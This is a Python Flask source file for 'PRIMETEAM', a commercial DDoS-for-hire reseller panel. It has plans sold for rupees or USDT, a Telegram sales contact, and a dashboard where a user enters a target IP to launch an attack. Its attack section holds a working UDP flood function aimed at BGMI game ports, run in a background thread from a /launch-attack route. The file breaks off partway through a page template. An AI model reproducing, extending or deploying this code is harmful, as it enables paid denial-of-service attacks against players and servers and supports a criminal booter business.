# app.py mein ye sab add karo

import os
import hashlib
import secrets
import time
import threading
import socket
import random
import struct
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for
import pymongo
from bson import ObjectId

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", secrets.token_hex(32))

# ============ MONGODB CONNECTION ============
MONGO_URL = os.getenv("MONGO_URL", "")

try:
    mongo_client = pymongo.MongoClient(MONGO_URL)
    db = mongo_client['primeteam']
    
    # ============ COLLECTIONS ============
    resellers_col = db['resellers']
    users_col = db['users']
    transactions_col = db['transactions']
    attacks_col = db['attacks']
    
    print("✅ MongoDB connected")
except Exception as e:
    print(f"⚠️ MongoDB error: {e}")
    resellers_col = None
    users_col = None
    transactions_col = None
    attacks_col = None

# ============ SCHEMAS / MODELS (YAHAN ADD KARO) ============

# 1. Complete Reseller Model
RESELLER_SCHEMA = {
    "username": "string",
    "password": "string", 
    "email": "string",
    "whatsapp": "string",
    "credits": 0,
    "distributed": 0,
    "total_profit": 0,
    "plan_limits": {
        "week_used": 0,
        "week_max": 25,
        "month_used": 0, 
        "month_max": 12,
        "season_used": 0,
        "season_max": 6
    },
    "created_at": datetime.now(),
    "is_admin": False
}

# 2. Complete User Model
USER_SCHEMA = {
    "reseller_id": None,  # ObjectId
    "username": "string",
    "email": "string",
    "plan": "week",  # week/month/season
    "expiry": None,  # datetime
    "activated_at": datetime.now(),
    "attack_count": 0,
    "last_attack": None
}

# 3. Complete Transaction Model  
TRANSACTION_SCHEMA = {
    "reseller_id": None,  # ObjectId
    "type": "credit_purchase",  # credit_purchase/plan_activation
    "amount": 0,  # in INR
    "credits": 0,
    "profit": 0,
    "timestamp": datetime.now(),
    "status": "completed"  # pending/completed
}

# 4. Attack Model
ATTACK_SCHEMA = {
    "reseller_id": None,  # ObjectId
    "target": "string",
    "port": 0,
    "method": "string",
    "duration": 0,
    "packets_sent": 0,
    "status": "pending",  # pending/running/completed
    "created_at": datetime.now()
}

# ============ HELPER FUNCTIONS ============

def create_reseller(data):
    """Create new reseller with schema validation"""
    if resellers_col is None:
        return None
    
    reseller_data = {
        "username": data.get("username"),
        "password": hashlib.sha256(data.get("password", "").encode()).hexdigest(),
        "email": data.get("email"),
        "whatsapp": data.get("whatsapp"),
        "credits": data.get("credits", 0),
        "distributed": 0,
        "total_profit": 0,
        "plan_limits": {
            "week_used": 0,
            "week_max": data.get("week_limit", 25),
            "month_used": 0,
            "month_max": data.get("month_limit", 12),
            "season_used": 0,
            "season_max": data.get("season_limit", 6)
        },
        "created_at": datetime.now(),
        "is_admin": data.get("is_admin", False)
    }
    
    return resellers_col.insert_one(reseller_data)

def create_user(reseller_id, username, email, plan_type):
    """Create new user under reseller"""
    if users_col is None:
        return None
    
    expiry_days = 7 if plan_type == "week" else 30 if plan_type == "month" else 60
    
    user_data = {
        "reseller_id": ObjectId(reseller_id) if isinstance(reseller_id, str) else reseller_id,
        "username": username,
        "email": email,
        "plan": plan_type,
        "expiry": datetime.now() + timedelta(days=expiry_days),
        "activated_at": datetime.now(),
        "attack_count": 0,
        "last_attack": None
    }
    
    return users_col.insert_one(user_data)

def add_transaction(reseller_id, trans_type, amount, credits, profit):
    """Add transaction record"""
    if transactions_col is None:
        return None
    
    transaction_data = {
        "reseller_id": ObjectId(reseller_id) if isinstance(reseller_id, str) else reseller_id,
        "type": trans_type,
        "amount": amount,
        "credits": credits,
        "profit": profit,
        "timestamp": datetime.now(),
        "status": "completed"
    }
    
    return transactions_col.insert_one(transaction_data)

def update_reseller_credits(reseller_id, credits_change, profit_change=0):
    """Update reseller credits and profit"""
    if resellers_col is None:
        return None
    
    update_data = {}
    if credits_change != 0:
        update_data["credits"] = credits_change
    if profit_change != 0:
        update_data["total_profit"] = profit_change
    
    if credits_change > 0:
        update_data["distributed"] = credits_change
    
    return resellers_col.update_one(
        {"_id": ObjectId(reseller_id) if isinstance(reseller_id, str) else reseller_id},
        {"$inc": update_data}
    )

def check_and_deduct_credits(reseller_id, required_credits):
    """Check if reseller has enough credits and deduct"""
    if resellers_col is None:
        return False
    
    reseller = resellers_col.find_one({"_id": ObjectId(reseller_id) if isinstance(reseller_id, str) else reseller_id})
    
    if reseller and reseller.get("credits", 0) >= required_credits:
        resellers_col.update_one(
            {"_id": reseller["_id"]},
            {"$inc": {"credits": -required_credits}}
        )
        return True
    return False

def check_plan_limit(reseller_id, plan_type):
    """Check if reseller has reached plan limit"""
    if resellers_col is None:
        return True
    
    reseller = resellers_col.find_one({"_id": ObjectId(reseller_id) if isinstance(reseller_id, str) else reseller_id})
    
    if not reseller:
        return False
    
    plan_limits = reseller.get("plan_limits", {})
    used_key = f"{plan_type}_used"
    max_key = f"{plan_type}_max"
    
    used = plan_limits.get(used_key, 0)
    max_limit = plan_limits.get(max_key, 0)
    
    return used < max_limit

def increment_plan_usage(reseller_id, plan_type):
    """Increment plan usage counter"""
    if resellers_col is None:
        return None
    
    used_key = f"plan_limits.{plan_type}_used"
    return resellers_col.update_one(
        {"_id": ObjectId(reseller_id) if isinstance(reseller_id, str) else reseller_id},
        {"$inc": {used_key: 1}}
    )

# ============ PLANS & CONFIGURATION ============

PLANS = {
    "week": {
        "name": "Week Plan",
        "duration": "7 days",
        "cost_credits": 200,
        "sell_price_inr": 850,
        "profit": 650,
        "attack_limit": 50,
        "max_duration": 300
    },
    "month": {
        "name": "Month Plan",
        "duration": "30 days",
        "cost_credits": 400,
        "sell_price_inr": 1800,
        "profit": 1400,
        "attack_limit": 200,
        "max_duration": 600
    },
    "season": {
        "name": "Season Plan",
        "duration": "60 days",
        "cost_credits": 800,
        "sell_price_inr": 2500,
        "profit": 1700,
        "attack_limit": 500,
        "max_duration": 1200
    }
}

CREDIT_PACKAGES = {
    "starter": {"credits": 5000, "price_inr": 5000, "price_usdt": 55, "week_limit": 25, "month_limit": 12, "season_limit": 6},
    "growth": {"credits": 10000, "price_inr": 10000, "price_usdt": 108, "week_limit": 50, "month_limit": 25, "season_limit": 12},
    "elite": {"credits": 20000, "price_inr": 20000, "price_usdt": 215, "week_limit": 100, "month_limit": 50, "season_limit": 25}
}

ATTACK_METHODS = {
    "UDP": {"name": "UDP Flood", "power": "🔥🔥🔥🔥🔥", "port": True},
    "TCP": {"name": "TCP Flood", "power": "🔥🔥🔥🔥", "port": True},
    "SYN": {"name": "SYN Flood", "power": "🔥🔥🔥🔥🔥", "port": True},
    "HTTP": {"name": "HTTP Flood", "power": "🔥🔥🔥", "port": False},
    "ICMP": {"name": "ICMP Flood", "power": "🔥🔥🔥🔥", "port": False}
}

# ============ ATTACK FUNCTIONS (YAHAN PEHLE WALE ATTACKS) ============

def bgmi_udp_flood(target_ip, port, duration, attack_id):
    """BGMI UDP Flood Attack"""
    try:
        if port == 0:
            bgmi_ports = [9001, 9002, 9003, 9004, 9005, 10001, 10002, 10003, 10004, 10005]
        else:
            bgmi_ports = [port]
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time:
            for bgmi_port in bgmi_ports:
                for _ in range(100):
                    payload = random._urandom(random.randint(64, 1400))
                    sock.sendto(payload, (target_ip, bgmi_port))
                    packets_sent += 1
            time.sleep(0.001)
        
        sock.close()
        
        if attacks_col:
            attacks_col.update_one({"_id": attack_id}, {"$set": {"status": "completed", "packets_sent": packets_sent}})
        
        return packets_sent
    except Exception as e:
        if attacks_col:
            attacks_col.update_one({"_id": attack_id}, {"$set": {"status": "failed", "error": str(e)}})
        return 0

def launch_bgmi_attack(target_ip, port, method, duration, attack_id):
    """Launch BGMI attack based on method"""
    if method == "UDP":
        return bgmi_udp_flood(target_ip, port, duration, attack_id)
    else:
        return bgmi_udp_flood(target_ip, port, duration, attack_id)

# ============ FLASK ROUTES START ============

@app.route('/')
def index():
    if 'reseller_id' in session:
        return redirect('/dashboard')
    return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if resellers_col:
            hashed = hashlib.sha256(password.encode()).hexdigest()
            reseller = resellers_col.find_one({"username": username, "password": hashed})
            
            if reseller:
                session['reseller_id'] = str(reseller['_id'])
                session['username'] = reseller['username']
                session['is_admin'] = reseller.get('is_admin', False)
                return redirect('/dashboard')
        
        return '<script>alert("Invalid credentials!"); window.location.href="/login";</script>'
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>PRIMETEAM - Login</title>
        <style>
            body {
                font-family: Arial;
                background: linear-gradient(135deg, #0a0a0f, #1a1a2e);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .card {
                background: rgba(255,255,255,0.1);
                backdrop-filter: blur(10px);
                padding: 40px;
                border-radius: 20px;
                width: 350px;
                text-align: center;
            }
            h1 {
                background: linear-gradient(135deg, #00ff88, #00bfff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            input {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background: rgba(0,0,0,0.5);
                border: 1px solid #333;
                border-radius: 8px;
                color: white;
            }
            button {
                width: 100%;
                padding: 12px;
                background: linear-gradient(135deg, #00ff88, #00bfff);
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-weight: bold;
            }
            a { color: #00ff88; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>🔥 PRIMETEAM</h1>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Login</button>
            </form>
            <p style="margin-top:20px;">New? <a href="/register">Register</a></p>
        </div>
    </body>
    </html>
    '''

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        email = request.form.get('email')
        whatsapp = request.form.get('whatsapp')
        password = request.form.get('password')
        confirm = request.form.get('confirm_password')
        package = request.form.get('package')
        
        if password != confirm:
            return '<script>alert("Passwords do not match!"); window.location.href="/register";</script>'
        
        if resellers_col and resellers_col.find_one({"username": username}):
            return '<script>alert("Username already exists!"); window.location.href="/register";</script>'
        
        package_info = CREDIT_PACKAGES[package]
        
        # Create reseller using schema
        reseller_data = {
            "username": username,
            "password": password,
            "email": email,
            "whatsapp": whatsapp,
            "credits": package_info["credits"],
            "week_limit": package_info["week_limit"],
            "month_limit": package_info["month_limit"],
            "season_limit": package_info["season_limit"],
            "is_admin": False
        }
        
        result = create_reseller(reseller_data)
        
        if result:
            # Add transaction for credit purchase
            add_transaction(result.inserted_id, "credit_purchase", package_info["price_inr"], package_info["credits"], 0)
            
            return '<script>alert("Registration successful! Please login."); window.location.href="/login";</script>'
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>PRIMETEAM - Register</title>
        <style>
            body {
                font-family: Arial;
                background: linear-gradient(135deg, #0a0a0f, #1a1a2e);
                min-height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .card {
                background: rgba(255,255,255,0.1);
                backdrop-filter: blur(10px);
                padding: 40px;
                border-radius: 20px;
                width: 400px;
            }
            h1 {
                background: linear-gradient(135deg, #00ff88, #00bfff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                text-align: center;
            }
            input, select {
                width: 100%;
                padding: 12px;
                margin: 10px 0;
                background: rgba(0,0,0,0.5);
                border: 1px solid #333;
                border-radius: 8px;
                color: white;
            }
            button {
                width: 100%;
                padding: 12px;
                background: linear-gradient(135deg, #00ff88, #00bfff);
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-weight: bold;
            }
        </style>
    </head>
    <body>
        <div class="card">
            <h1>🔥 PRIMETEAM</h1>
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="email" name="email" placeholder="Email" required>
                <input type="text" name="whatsapp" placeholder="WhatsApp Number" required>
                <input type="password" name="password" placeholder="Password" required>
                <input type="password" name="confirm_password" placeholder="Confirm Password" required>
                <select name="package">
                    <option value="starter">Starter Pack - 5,000 Credits (₹5,000)</option>
                    <option value="growth">Growth Pack - 10,000 Credits (₹10,000)</option>
                    <option value="elite">Elite Pack - 20,000 Credits (₹20,000)</option>
                </select>
                <button type="submit">Register</button>
            </form>
            <p style="text-align:center; margin-top:20px;"><a href="/login">Already have account? Login</a></p>
        </div>
    </body>
    </html>
    '''

@app.route('/dashboard')
def dashboard():
    if 'reseller_id' not in session:
        return redirect('/login')
    
    reseller = resellers_col.find_one({"_id": ObjectId(session['reseller_id'])})
    if not reseller:
        return redirect('/login')
    
    # Get stats
    total_users = users_col.count_documents({"reseller_id": ObjectId(session['reseller_id'])}) if users_col else 0
    total_attacks = attacks_col.count_documents({"reseller_id": ObjectId(session['reseller_id'])}) if attacks_col else 0
    total_profit = reseller.get('total_profit', 0)
    
    # Get recent attacks
    recent_attacks = []
    if attacks_col:
        recent_attacks = list(attacks_col.find({"reseller_id": ObjectId(session['reseller_id'])}).sort("created_at", -1).limit(10))
    
    # Get recent users
    recent_users = []
    if users_col:
        recent_users = list(users_col.find({"reseller_id": ObjectId(session['reseller_id'])}).sort("activated_at", -1).limit(5))
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>PRIMETEAM - Dashboard</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #0a0a0f;
                color: #fff;
            }}
            .sidebar {{
                position: fixed;
                left: 0;
                top: 0;
                width: 260px;
                height: 100%;
                background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 100%);
                padding: 20px;
            }}
            .logo {{
                font-size: 28px;
                font-weight: bold;
                text-align: center;
                padding: 20px;
                background: linear-gradient(135deg, #00ff88, #00bfff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 30px;
            }}
            .nav-item {{
                display: block;
                padding: 12px 20px;
                margin: 5px 0;
                border-radius: 10px;
                color: #fff;
                text-decoration: none;
                transition: 0.3s;
            }}
            .nav-item:hover, .nav-item.active {{
                background: linear-gradient(135deg, #00ff88, #00bfff);
                color: #000;
            }}
            .main {{
                margin-left: 260px;
                padding: 30px;
            }}
            .stats {{
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                gap: 20px;
                margin-bottom: 30px;
            }}
            .stat-card {{
                background: rgba(255,255,255,0.05);
                border-radius: 15px;
                padding: 20px;
                text-align: center;
            }}
            .stat-number {{
                font-size: 36px;
                font-weight: bold;
                background: linear-gradient(135deg, #00ff88, #00bfff);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }}
            .section {{
                background: rgba(255,255,255,0.05);
                border-radius: 20px;
                padding: 25px;
                margin-bottom: 30px;
            }}
            table {{
                width: 100%;
                border-collapse: collapse;
                margin-top: 15px;
            }}
            th, td {{
                padding: 12px;
                text-align: left;
                border-bottom: 1px solid #333;
            }}
            th {{
                color: #00ff88;
            }}
            .btn {{
                background: linear-gradient(135deg, #00ff88, #00bfff);
                padding: 10px 20px;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                color: #000;
                font-weight: bold;
                text-decoration: none;
                display: inline-block;
            }}
            @media (max-width: 768px) {{
                .sidebar {{ display: none; }}
                .main {{ margin-left: 0; }}
                .stats {{ grid-template-columns: 1fr; }}
            }}
        </style>
    </head>
    <body>
        <div class="sidebar">
            <div class="logo">🔥 PRIMETEAM</div>
            <a href="/dashboard" class="nav-item active">📊 Dashboard</a>
            <a href="/attack" class="nav-item">💥 Attack</a>
            <a href="/users" class="nav-item">👥 Users</a>
            <a href="/transactions" class="nav-item">💰 Transactions</a>
            <a href="/buy-credits" class="nav-item">💎 Buy Credits</a>
            <a href="/profile" class="nav-item">👤 Profile</a>
            <a href="/logout" class="nav-item">🚪 Logout</a>
        </div>
        
        <div class="main">
            <h1>Welcome, {reseller['username']}!</h1>
            <p>Reseller Dashboard</p>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>Credits</h3>
                    <div class="stat-number">{reseller['credits']:,}</div>
                </div>
                <div class="stat-card">
                    <h3>Distributed</h3>
                    <div class="stat-number">{reseller['distributed']:,}</div>
                </div>
                <div class="stat-card">
                    <h3>Users</h3>
                    <div class="stat-number">{total_users}</div>
                </div>
                <div class="stat-card">
                    <h3>Profit</h3>
                    <div class="stat-number">₹{total_profit:,}</div>
                </div>
            </div>
            
            <div class="section">
                <h2>🎯 Quick Attack</h2>
                <form id="attackForm">
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
                        <div>
                            <label>Target IP</label>
                            <input type="text" id="target" style="width:100%; padding:10px; background:#1a1a2e; border:1px solid #333; border-radius:8px; color:white;" required>
                        </div>
                        <div>
                            <label>Port (0=all)</label>
                            <input type="number" id="port" value="0" style="width:100%; padding:10px; background:#1a1a2e; border:1px solid #333; border-radius:8px; color:white;">
                        </div>
                        <div>
                            <label>Method</label>
                            <select id="method" style="width:100%; padding:10px; background:#1a1a2e; border:1px solid #333; border-radius:8px; color:white;">
                                <option value="UDP">UDP Flood</option>
                                <option value="TCP">TCP Flood</option>
                                <option value="SYN">SYN Flood</option>
                                <option value="HTTP">HTTP Flood</option>
                                <option value="ICMP">ICMP Flood</option>
                            </select>
                        </div>
                        <div>
                            <label>Duration (sec)</label>
                            <input type="number" id="duration" value="60" max="60" style="width:100%; padding:10px; background:#1a1a2e; border:1px solid #333; border-radius:8px; color:white;">
                        </div>
                        <div>
                            <label>&nbsp;</label>
                            <button type="submit" class="btn" style="width:100%;">💥 LAUNCH</button>
                        </div>
                    </div>
                </form>
            </div>
            
            <div class="section">
                <h2>👥 Recent Users</h2>
                <table>
                    <thead><tr><th>Username</th><th>Plan</th><th>Expiry</th><th>Status</th></tr></thead>
                    <tbody>
                        {''.join([f'<tr><td>{u.get("username", "N/A")}</td><td>{u.get("plan", "N/A")}</td><td>{u.get("expiry", datetime.now()).strftime("%Y-%m-%d") if u.get("expiry") else "N/A"}</td><td>Active</td></tr>' for u in recent_users]) if recent_users else '<tr><td colspan="4" style="text-align:center">No users yet</td></tr>'}
                    </tbody>
                </table>
                <a href="/users" class="btn" style="margin-top:15px; display:inline-block;">View All Users →</a>
            </div>
            
            <div class="section">
                <h2>📊 Recent Attacks</h2>
                <table>
                    <thead><tr><th>Target</th><th>Method</th><th>Duration</th><th>Packets</th><th>Status</th></tr></thead>
                    <tbody>
                        {''.join([f'<tr><td>{a.get("target", "N/A")}</td><td>{a.get("method", "N/A")}</td><td>{a.get("duration", 0)}s</td><td>{a.get("packets_sent", 0):,}</td><td>{a.get("status", "N/A").upper()}</td></tr>' for a in recent_attacks]) if recent_attacks else '<tr><td colspan="5" style="text-align:center">No attacks yet</td></tr>'}
                    </tbody>
                </table>
                <a href="/history" class="btn" style="margin-top:15px; display:inline-block;">View History →</a>
            </div>
        </div>
        
        <script>
            document.getElementById('attackForm').onsubmit = async function(e) {{
                e.preventDefault();
                let target = document.getElementById('target').value;
                let port = document.getElementById('port').value;
                let method = document.getElementById('method').value;
                let duration = document.getElementById('duration').value;
                
                let btn = event.submitter;
                let originalText = btn.textContent;
                btn.textContent = '🔥 ATTACKING... 🔥';
                btn.disabled = true;
                
                let res = await fetch('/launch-attack', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{target, port, method, duration}})
                }});
                
                let data = await res.json();
                if(data.success) {{
                    alert('✅ Attack launched!\\nTarget: ' + target + '\\nDuration: ' + duration + 's');
                    location.reload();
                }} else {{
                    alert('❌ Error: ' + data.error);
                }}
                
                btn.textContent = originalText;
                btn.disabled = false;
            }};
        </script>
    </body>
    </html>
    '''

@app.route('/launch-attack', methods=['POST'])
def launch_attack():
    if 'reseller_id' not in session:
        return jsonify({"success": False, "error": "Not logged in"})
    
    data = request.json
    target = data.get('target')
    port = int(data.get('port', 0))
    method = data.get('method', 'UDP')
    duration = int(data.get('duration', 60))
    
    # Limit to 60 seconds
    if duration > 60:
        duration = 60
    
    # Create attack record
    attack_data = {
        "reseller_id": ObjectId(session['reseller_id']),
        "target": target,
        "port": port,
        "method": method,
        "duration": duration,
        "status": "running",
        "packets_sent": 0,
        "created_at": datetime.now()
    }
    
    result = attacks_col.insert_one(attack_data)
    attack_id = result.inserted_id
    
    # Launch attack in background
    thread = threading.Thread(target=launch_bgmi_attack, args=(target, port, method, duration, attack_id))
    thread.daemon = True
    thread.start()
    
    return jsonify({"success": True, "attack_id": str(attack_id)})

@app.route('/users')
def users_list():
    if 'reseller_id' not in session:
        return redirect('/login')
    
    users = list(users_col.find({"reseller_id": ObjectId(session['reseller_id'])}).sort("activated_at", -1)) if users_col else []
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Users - PRIMETEAM</title>
        <style>
            body {{
                font-family: Arial;
                background: #0a0a0f;
                color: white;
                padding: 20px;
            }}
            .container {{ max-width: 1200px; margin: 0 auto; }}
            table {{
                width: 100%;
                border-collapse: collapse;
                background: rgba(255,255,255,0.05);
                border-radius: 10px;
            }}
            th, td {{
                padding: 15px;
                text-align: left;
                border-bottom: 1px solid #333;
            }}
            th {{ background: rgba(0,255,136,0.2); color: #00ff88; }}
            .btn {{
                background: #00ff88;
                padding: 10px 20px;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                color: #000;
                text-decoration: none;
                display: inline-block;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>👥 Your Users</h1>
            <a href="/dashboard" class="btn">← Back</a>
            <div style="margin: 20px 0;">
                <input type="text" id="search" placeholder="Search user..." style="padding:10px; width:300px; background:#1a1a2e; border:1px solid #333; border-radius:8px; color:white;">
                <button onclick="searchUser()" class="btn">Search</button>
            </div>
            <table>
                <thead>
                    <tr><th>Username</th><th>Email</th><th>Plan</th><th>Expiry</th><th>Activated</th></tr>
                </thead>
                <tbody id="userTable">
                    {''.join([f'<tr><td>{u.get("username", "N/A")}</td><td>{u.get("email", "N/A")}</td><td>{u.get("plan", "N/A")}</td><td>{u.get("expiry", datetime.now()).strftime("%Y-%m-%d") if u.get("expiry") else "N/A"}</td><td>{u.get("activated_at", datetime.now()).strftime("%Y-%m-%d") if u.get("activated_at") else "N/A"}</td></tr>' for u in users]) if users else '<tr><td colspan="5" style="text-align:center">No users yet</td></tr>'}
                </tbody>
            </table>
        </div>
        <script>
            function searchUser() {{
                let search = document.getElementById('search').value.toLowerCase();
                let rows = document.querySelectorAll('#userTable tr');
                rows.forEach(row => {{
                    let text = row.textContent.toLowerCase();
                    row.style.display = text.includes(search) ? '' : 'none';
                }});
            }}
        </script>
    </body>
    </html>
    '''

@app.route('/transactions')
def transactions_list():
    if 'reseller_id' not in session:
        return redirect('/login')
    
    transactions = list(transactions_col.find({"reseller_id": ObjectId(session['reseller_id'])}).sort("timestamp", -1).limit(50)) if transactions_col else []
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Transactions - PRIMETEAM</title>
        <style>
            body {{
                font-family: Arial;
                background: #0a0a0f;
                color: white;
                padding: 20px;
            }}
            .container {{ max-width: 1200px; margin: 0 auto; }}
            table {{
                width: 100%;
                border-collapse: collapse;
                background: rgba(255,255,255,0.05);
                border-radius: 10px;
            }}
            th, td {{
                padding: 15px;
                text-align: left;
                border-bottom: 1px solid #333;
            }}
            th {{ background: rgba(0,255,136,0.2); color: #00ff88; }}
            .btn {{
                background: #00ff88;
                padding: 10px 20px;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                color: #000;
                text-decoration: none;
                display: inline-block;
            }}
            .profit {{ color: #00ff88; }}
            .credit {{ color: #ffcc00; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>💰 Transaction History</h1>
            <a href="/dashboard" class="btn">← Back</a>
            <table>
                <thead>
                    <tr><th>Date</th><th>Type</th><th>Amount</th><th>Credits</th><th>Profit</th><th>Status</th></tr>
                </thead>
                <tbody>
                    {''.join([f'<tr><td>{t.get("timestamp", datetime.now()).strftime("%Y-%m-%d %H:%M") if t.get("timestamp") else "N/A"}</td><td>{t.get("type", "N/A")}</td><td>₹{t.get("amount", 0):,}</td><td class="credit">{t.get("credits", 0):,}</td><td class="profit">₹{t.get("profit", 0):,}</td><td>{t.get("status", "N/A")}</td>' for t in transactions]) if transactions else '<tr><td colspan="6" style="text-align:center">No transactions yet</td></tr>'}
                </tbody>
            </table>
        </div>
    </body>
    </html>
    '''

@app.route('/buy-credits')
def buy_credits():
    if 'reseller_id' not in session:
        return redirect('/login')
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Buy Credits - PRIMETEAM</title>
        <style>
            body {
                font-family: Arial;
                background: linear-gradient(135deg, #0a0a0f, #1a1a2e);
                color: white;
                padding: 20px;
            }
            .container { max-width: 1200px; margin: 0 auto; }
            .packages {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 30px;
                margin: 40px 0;
            }
            .package {
                background: rgba(255,255,255,0.1);
                padding: 30px;
                border-radius: 20px;
                text-align: center;
                transition: 0.3s;
            }
            .package:hover { transform: translateY(-5px); background: rgba(255,255,255,0.15); }
            .price { font-size: 48px; color: #00ff88; margin: 20px 0; }
            .btn {
                background: linear-gradient(135deg, #00ff88, #00bfff);
                padding: 12px 30px;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-weight: bold;
            }
            .contact {
                text-align: center;
                margin-top: 50px;
                padding: 30px;
                background: rgba(255,255,255,0.05);
                border-radius: 20px;
            }
            a { color: #00ff88; text-decoration: none; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>💰 Buy Credits</h1>
            <a href="/dashboard">← Back to Dashboard</a>
            
            <div class="packages">
                <div class="package">
                    <h2>Starter</h2>
                    <p>5,000 Credits</p>
                    <div class="price">₹5,000</div>
                    <p>or $55 USDT</p>
                    <p>📦 Week: 25 | Month: 12 | Season: 6</p>
                    <button class="btn" onclick="contact()">Contact to Buy</button>
                </div>
                <div class="package">
                    <h2>Growth 🔥</h2>
                    <p>10,000 Credits</p>
                    <div class="price">₹10,000</div>
                    <p>or $108 USDT</p>
                    <p>📦 Week: 50 | Month: 25 | Season: 12</p>
                    <button class="btn" onclick="contact()">Contact to Buy</button>
                </div>
                <div class="package">
                    <h2>Elite 👑</h2>
                    <p>20,000 Credits</p>
                    <div class="price">₹20,000</div>
                    <p>or $215 USDT</p>
                    <p>📦 Week: 100 | Month: 50 | Season: 25</p>
                    <button class="btn" onclick="contact()">Contact to Buy</button>
                </div>
            </div>
            
            <div class="contact">
                <h3>📞 Contact Admin</h3>
                <p>Telegram: <strong>@primexarmy</strong></p>
                <p>Payment: Bank Transfer / USDT (TRC20) / UPI</p>
            </div>
        </div>
        
        <script>
            function contact() {
                alert("Contact admin on Telegram: @primexarmy\\n\\nPayment Options:\\n- Bank Transfer (INR)\\n- USDT (TRC20)\\n- UPI");
            }
        </script>
    </body>
    </html>
    '''

@app.route('/profile')
def profile():
    if 'reseller_id' not in session:
        return redirect('/login')
    
    reseller = resellers_col.find_one({"_id": ObjectId(session['reseller_id'])})
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Profile - PRIMETEAM</title>
        <style>
            body {{
                font-family: Arial;
                background: #0a0a0f;
                color: white;
                padding: 20px;
            }}
            .container {{ max-width: 600px; margin: 0 auto; }}
            .card {{
                background: rgba(255,255,255,0.05);
                padding: 30px;
                border-radius: 20px;
            }}
            .info {{ margin: 15px 0; padding: 10px; background: rgba(255,255,255,0.03); border-radius: 8px; }}
            .label {{ color: #00ff88; font-weight: bold; }}
            .btn {{
                background: #00ff88;
                padding: 10px 20px;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                color: #000;
                text-decoration: none;
                display: inline-block;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>👤 My Profile</h1>
            <a href="/dashboard" class="btn">← Back</a>
            
            <div class="card">
                <div class="info"><span class="label">Username:</span> {reseller['username']}</div>
                <div class="info"><span class="label">Email:</span> {reseller.get('email', 'N/A')}</div>
                <div class="info"><span class="label">WhatsApp:</span> {reseller.get('whatsapp', 'N/A')}</div>
                <div class="info"><span class="label">Available Credits:</span> {reseller['credits']:,}</div>
                <div class="info"><span class="label">Credits Distributed:</span> {reseller.get('distributed', 0):,}</div>
                <div class="info"><span class="label">Total Profit:</span> ₹{reseller.get('total_profit', 0):,}</div>
                <div class="info"><span class="label">Plan Limits:</span> Week: {reseller.get('plan_limits', {{}}).get('week_used', 0)}/{reseller.get('plan_limits', {{}}).get('week_max', 0)} | Month: {reseller.get('plan_limits', {{}}).get('month_used', 0)}/{reseller.get('plan_limits', {{}}).get('month_max', 0)} | Season: {reseller.get('plan_limits', {{}}).get('season_used', 0)}/{reseller.get('plan_limits', {{}}).get('season_max', 0)}</div>
                <div class="info"><span class="label">Joined:</span> {reseller.get('created_at', datetime.now()).strftime('%Y-%m-%d') if reseller.get('created_at') else 'N/A'}</div>
            </div>
        </div>
    </body>
    </html>
    '''

@app.route('/history')
def attack_history():
    if 'reseller_id' not in session:
        return redirect('/login')
    
    attacks = list(attacks_col.find({"reseller_id": ObjectId(session['reseller_id'])}).sort("created_at", -1).limit(100)) if attacks_col else []
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Attack History - PRIMETEAM</title>
        <style>
            body {{
                font-family: Arial;
                background: #0a0a0f;
                color: white;
                padding: 20px;
            }}
            .container {{ max-width: 1200px; margin: 0 auto; }}
            table {{
                width: 100%;
                border-collapse: collapse;
                background: rgba(255,255,255,0.05);
                border-radius: 10px;
            }}
            th, td {{
                padding: 15px;
                text-align: left;
                border-bottom: 1px solid #333;
